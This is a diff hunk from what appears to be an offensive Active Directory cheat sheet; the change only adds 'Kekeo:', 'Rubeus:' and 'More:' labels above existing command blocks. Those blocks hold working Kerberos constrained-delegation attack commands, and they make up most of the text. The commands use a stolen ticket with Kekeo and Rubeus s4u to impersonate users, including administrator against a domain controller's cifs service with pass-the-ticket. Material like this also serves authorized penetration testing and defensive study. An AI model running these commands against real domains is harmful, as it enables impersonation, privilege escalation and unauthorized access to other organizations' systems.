@@ -709,16 +709,19 @@ Or using ActiveDirectory module:
 
 #### Using S4U and the previous TGT, request a TGS:
 
+Kekeo:
 ```
 tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 /user:user_we_are_impersonating@ecorp.lab
 /service:ServiceListedIn{msDS-AllowedToDelegateTo}
 ```
 
+Rubeus:
 ```
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}
 ```
-OTHER:-
+
+More:
 ```
 Rubeus.exe tgtdeleg
 Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
